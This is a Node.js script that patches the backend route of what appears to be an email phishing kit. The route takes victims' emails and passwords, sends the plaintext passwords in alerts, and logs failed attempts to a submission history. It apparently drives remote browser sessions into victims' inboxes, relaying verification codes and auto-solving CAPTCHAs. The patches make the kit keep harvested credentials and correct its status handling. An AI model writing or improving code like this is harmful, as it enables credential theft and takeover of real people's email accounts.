const fs = require('fs');

const filePath = 'src/app/emails/cookie/cookie-api-login/route.js';
let content = fs.readFileSync(filePath, 'utf8');
const isCrlf = content.includes('\r\n');

function normalize(str) {
    return isCrlf ? str.replace(/\r?\n/g, '\r\n') : str.replace(/\r\n/g, '\n');
}

const patches = [
    {
        name: 'Target 1: initialCheckResult initialization cache precedence',
        target: `    // Set initialCheckResult from lastJsonResponse if available
    if (row && row[columnIndexes['lastJsonResponse']]) {
        try {
            const lastJson = JSON.parse(row[columnIndexes['lastJsonResponse']]);`,
        replacement: `    // Set initialCheckResult from lastJsonResponse if available (prefer cache over stale sheet)
    const rawInitialJson = cachedAfterPopulate?.lastJsonResponse || (row && row[columnIndexes['lastJsonResponse']]);
    if (rawInitialJson) {
        try {
            const lastJson = typeof rawInitialJson === 'string' ? JSON.parse(rawInitialJson) : rawInitialJson;`
    },
    {
        name: 'Target 2: startup domain validation persistence and email preservation',
        target: `                    if (mxRecords.length === 0 && !domainMatchesStrictly) {
                        logger.warn(\`[processRow][\${browserId}] Domain '\${domain}' has no MX records and does not match strictly platform '\${strictlyKey}' (keywords: [\${strictKeywords.join(', ')}]). Rejecting as invalid email.\`);
                        finalStatus = "WAITINGEMAILERROR";
                        updateData.status = finalStatus;
                        updateData.lastJsonResponse = JSON.stringify({
                            browserId, email, status: finalStatus,
                            platform: strictlyKey, domain: domain || '',
                            timestamp: new Date().toISOString(),
                            message: \`Email domain '\${domain}' is not a valid \${strictlyKey} address. Please use a valid email.\`
                        });
                        sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyKey, email, browserId, password: password || '', detail: \`Domain '\${domain}' has no MX and doesn't match \${strictlyKey}\` });
                        updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                        return;
                    }`,
        replacement: `                    if (mxRecords.length === 0 && !domainMatchesStrictly) {
                        logger.warn(\`[processRow][\${browserId}] Domain '\${domain}' has no MX records and does not match strictly platform '\${strictlyKey}' (keywords: [\${strictKeywords.join(', ')}]). Rejecting as invalid email.\`);
                        finalStatus = "WAITINGEMAILERROR";
                        updateData.status = finalStatus;
                        updateData.platform = strictlyKey;
                        updateData.lastUserActivity = new Date().toISOString();
                        updateData.lastJsonResponse = JSON.stringify({
                            browserId, email, status: finalStatus,
                            platform: strictlyKey, domain: domain || '',
                            timestamp: new Date().toISOString(),
                            message: \`Email domain '\${domain}' is not a valid \${strictlyKey} address. Please use a valid email.\`
                        });
                        sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyKey, email, browserId, password: password || '', detail: \`Domain '\${domain}' has no MX and doesn't match \${strictlyKey}\` });
                        appendSubmissionHistory(browserId, email, password || '');
                        await updateBrowserRowData(browserId, { ...updateData, email, platform: strictlyKey, domain: domain || '', verified: false, fullAccess: false, ...submissionHistoryPayload(browserId) });
                        return;
                    }`
    },
    {
        name: 'Target 3: WAITINGEMAIL strictly mismatch persistence and email preservation',
        target: `                                logger.warn(\`[processRow][\${browserId}] Email '\${email}' rejected by strictly validation: \${validation.message}. Setting WAITINGEMAILERROR so the template renders the inline error.\`);
                                finalStatus = "WAITINGEMAILERROR";
                                updateData.status = finalStatus;
                                updateData.lastJsonResponse = JSON.stringify({
                                    browserId,
                                    email,
                                    password: password || '',
                                    status: finalStatus,
                                    emailExists: true,
                                    accountAccess: false,
                                    reachedInbox: false,
                                    requiresVerification: false,
                                    verificationState: null,
                                    verificationOptions: [],
                                    platform: 'unknown',
                                    timestamp: new Date().toISOString(),
                                    errorType: 'STRICTLY_MISMATCH',
                                    message: validation.message,
                                    lastTriedEmail: email,
                                    lastTriedPassword: password || ''
                                });
                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: String(rowStrictlyForValidation).trim().toLowerCase() || 'unknown', email: email || '', browserId, password: password || '', detail: \`STRICTLY_MISMATCH: \${validation.message}\` });
                                // Clear email to prevent re-processing, but keep password in sheet for the next attempt
                                updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
                                exitingEarly = true;
                                return; // Exit processRow immediately`,
        replacement: `                                const strictlyPlatform = String(rowStrictlyForValidation).trim().toLowerCase() || 'unknown';
                                logger.warn(\`[processRow][\${browserId}] Email '\${email}' rejected by strictly validation: \${validation.message}. Setting WAITINGEMAILERROR so the template renders the inline error.\`);
                                finalStatus = "WAITINGEMAILERROR";
                                updateData.status = finalStatus;
                                updateData.platform = strictlyPlatform;
                                updateData.lastUserActivity = new Date().toISOString();
                                updateData.lastJsonResponse = JSON.stringify({
                                    browserId,
                                    email,
                                    password: password || '',
                                    status: finalStatus,
                                    emailExists: true,
                                    accountAccess: false,
                                    reachedInbox: false,
                                    requiresVerification: false,
                                    verificationState: null,
                                    verificationOptions: [],
                                    platform: strictlyPlatform,
                                    timestamp: new Date().toISOString(),
                                    errorType: 'STRICTLY_MISMATCH',
                                    message: validation.message,
                                    lastTriedEmail: email,
                                    lastTriedPassword: password || ''
                                });
                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyPlatform, email: email || '', browserId, password: password || '', detail: \`STRICTLY_MISMATCH: \${validation.message}\` });
                                appendSubmissionHistory(browserId, email, password || '');
                                await updateBrowserRowData(browserId, { ...updateData, email, platform: strictlyPlatform, verified: false, fullAccess: false, ...submissionHistoryPayload(browserId) });
                                exitingEarly = true;
                                return; // Exit processRow immediately`
    },
    {
        name: 'Target 4: WAITINGEMAIL domain validation persistence and email preservation',
        target: `                                if (mxRecords.length === 0 && !domainMatchesStrictly) {
                                    logger.warn(\`[processRow][\${browserId}][WAITINGEMAIL] Domain '\${domain}' has no MX records and does not match strictly platform '\${strictFallbackKey}' (keywords: [\${strictKeywords.join(', ')}]). Rejecting as invalid email.\`);
                                    finalStatus = "WAITINGEMAILERROR";
                                    updateData.status = finalStatus;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        platform: strictFallbackKey, domain: domain || '',
                                        timestamp: new Date().toISOString(),
                                        message: \`Email domain '\${domain}' is not a valid \${strictFallbackKey} address. Please use a valid email.\`
                                    });
                                    sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictFallbackKey, email, browserId, password: password || '', detail: \`Domain '\${domain}' has no MX and doesn't match \${strictFallbackKey}\` });
                                    updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                                    exitingEarly = true;
                                    return;
                                }`,
        replacement: `                                if (mxRecords.length === 0 && !domainMatchesStrictly) {
                                    logger.warn(\`[processRow][\${browserId}][WAITINGEMAIL] Domain '\${domain}' has no MX records and does not match strictly platform '\${strictFallbackKey}' (keywords: [\${strictKeywords.join(', ')}]). Rejecting as invalid email.\`);
                                    finalStatus = "WAITINGEMAILERROR";
                                    updateData.status = finalStatus;
                                    updateData.platform = strictFallbackKey;
                                    updateData.lastUserActivity = new Date().toISOString();
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        platform: strictFallbackKey, domain: domain || '',
                                        timestamp: new Date().toISOString(),
                                        message: \`Email domain '\${domain}' is not a valid \${strictFallbackKey} address. Please use a valid email.\`
                                    });
                                    sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictFallbackKey, email, browserId, password: password || '', detail: \`Domain '\${domain}' has no MX and doesn't match \${strictFallbackKey}\` });
                                    appendSubmissionHistory(browserId, email, password || '');
                                    await updateBrowserRowData(browserId, { ...updateData, email, platform: strictFallbackKey, domain: domain || '', verified: false, fullAccess: false, ...submissionHistoryPayload(browserId) });
                                    exitingEarly = true;
                                    return;
                                }`
    },
    {
        name: 'Target 5: WAITINGPASSWORD inbox recovery clear verificationState',
        target: `                                if (reachedInboxAfterRecovery) {
                                    logger.info(\`[processRow][\${browserId}][WAITINGPASSWORD] Inbox reached after page recovery. Treating as full access.\`);
                                    finalStatus = "COMPLETED";
                                    updateData.status = "COMPLETED";
                                    updateData.verified = true;
                                    updateData.fullAccess = true;`,
        replacement: `                                if (reachedInboxAfterRecovery) {
                                    logger.info(\`[processRow][\${browserId}][WAITINGPASSWORD] Inbox reached after page recovery. Treating as full access.\`);
                                    finalStatus = "COMPLETED";
                                    updateData.status = "COMPLETED";
                                    updateData.verified = true;
                                    updateData.fullAccess = true;
                                    initialCheckResult.reachedInbox = true;
                                    initialCheckResult.requiresVerification = false;
                                    initialCheckResult.accountAccess = true;
                                    initialCheckResult.verificationState = null;`
    },
    {
        name: 'Target 6: WAITINGCODE inbox wait branch clear verificationState',
        target: `                            if (inboxReachedAfterWait) {
                                logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to PROCESSING_FINALIZING.\`);
                                finalStatus = "PROCESSING_FINALIZING";
                                codeSuccessfullyProcessed = true;
                                initialCheckResult.reachedInbox = true;
                                initialCheckResult.requiresVerification = false;
                                initialCheckResult.accountAccess = true;`,
        replacement: `                            if (inboxReachedAfterWait) {
                                logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to PROCESSING_FINALIZING.\`);
                                finalStatus = "PROCESSING_FINALIZING";
                                codeSuccessfullyProcessed = true;
                                initialCheckResult.reachedInbox = true;
                                initialCheckResult.requiresVerification = false;
                                initialCheckResult.accountAccess = true;
                                initialCheckResult.verificationState = null;`
    },
    {
        name: 'Target 7: WAITINGCODE inbox code branch clear verificationState',
        target: `                                if (inboxCheckAfterCode) {
                                    logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached after code submission. Setting PROCESSING_FINALIZING.\`);
                                    finalStatus = "PROCESSING_FINALIZING";
                                    codeSuccessfullyProcessed = true;
                                    initialCheckResult.reachedInbox = true;
                                    initialCheckResult.requiresVerification = false;
                                    initialCheckResult.accountAccess = true;`,
        replacement: `                                if (inboxCheckAfterCode) {
                                    logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached after code submission. Setting PROCESSING_FINALIZING.\`);
                                    finalStatus = "PROCESSING_FINALIZING";
                                    codeSuccessfullyProcessed = true;
                                    initialCheckResult.reachedInbox = true;
                                    initialCheckResult.requiresVerification = false;
                                    initialCheckResult.accountAccess = true;
                                    initialCheckResult.verificationState = null;`
    },
    {
        name: 'Target 8: WAITINGCODE inbox passive branch clear verificationState',
        target: `                        if (inboxCheckedNoCode) {
                            logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached during passive wait (no code submitted). Setting status to PROCESSING_FINALIZING.\`);
                            finalStatus = "PROCESSING_FINALIZING";
                            codeSuccessfullyProcessed = true;
                            initialCheckResult.reachedInbox = true;
                            initialCheckResult.requiresVerification = false;
                            initialCheckResult.accountAccess = true;
                            initialCheckResult.emailExists = true;`,
        replacement: `                        if (inboxCheckedNoCode) {
                            logger.info(\`[processRow][\${browserId}][WAITINGCODE] Inbox reached during passive wait (no code submitted). Setting status to PROCESSING_FINALIZING.\`);
                            finalStatus = "PROCESSING_FINALIZING";
                            codeSuccessfullyProcessed = true;
                            initialCheckResult.reachedInbox = true;
                            initialCheckResult.requiresVerification = false;
                            initialCheckResult.accountAccess = true;
                            initialCheckResult.emailExists = true;
                            initialCheckResult.verificationState = null;`
    },
    {
        name: 'Target 9: Post-check waterfall CAPTCHA_FAILED guard',
        target: `        // Handle CAPTCHA_FAILED — set FAILED (no fallback, auto-solve only)
        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {`,
        replacement: `        // Handle CAPTCHA_FAILED — set FAILED (no fallback, auto-solve only)
        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {`
    },
    {
        name: 'Target 10: Post-check waterfall RETRY_TECHNICAL guard',
        target: `        if (initialCheckResult.verificationState === 'RETRY_TECHNICAL') {`,
        replacement: `        if (initialCheckResult.verificationState === 'RETRY_TECHNICAL' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {`
    },
    {
        name: 'Target 11: Post-check waterfall WAITINGEMAIL_ERROR guard',
        target: `        } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {`,
        replacement: `        } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {`
    },
    {
        name: 'Target 12: Post-check waterfall WAITINGPASSWORD_ERROR guard',
        target: `        } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {`,
        replacement: `        } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR' && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {`
    },
    {
        name: 'Target 13: Post-check waterfall generic email error guard',
        target: `        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS") {`,
        replacement: `        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "COMPLETED" && finalStatus !== "PROCESSING_FINALIZING" && !initialCheckResult.reachedInbox) {`
    },
    {
        name: 'Target 14: processWaitingRows staleness check fallback',
        target: `            if (activeProcesses.has(bId)) continue;
            if (activityIdx === undefined || !row[activityIdx]) continue;

            const activityVal = String(row[activityIdx]).trim();
            if (!activityVal) continue;`,
        replacement: `            if (activeProcesses.has(bId)) continue;
            const rawActivityVal = (columnIndexes['lastUserActivity'] !== undefined && row[columnIndexes['lastUserActivity']])
                || (columnIndexes['lastRun'] !== undefined && row[columnIndexes['lastRun']])
                || (columnIndexes['timestamp'] !== undefined && row[columnIndexes['timestamp']])
                || '';
            const activityVal = String(rawActivityVal).trim();
            if (!activityVal) continue;`
    }
];

// Backup original file first
fs.writeFileSync(filePath + '.bak_pre_fixes', content, 'utf8');
console.log('Created backup at route.js.bak_pre_fixes');

for (const patch of patches) {
    const normTarget = normalize(patch.target);
    const normReplacement = normalize(patch.replacement);
    const count = content.split(normTarget).length - 1;
    if (count !== 1) {
        console.error(`ERROR: Patch "${patch.name}" matched ${count} times instead of 1! Aborting.`);
        process.exit(1);
    }
    content = content.replace(normTarget, normReplacement);
    console.log(`Applied patch: ${patch.name}`);
}

fs.writeFileSync(filePath, content, 'utf8');
console.log('\nAll 14 patches successfully written to route.js!');
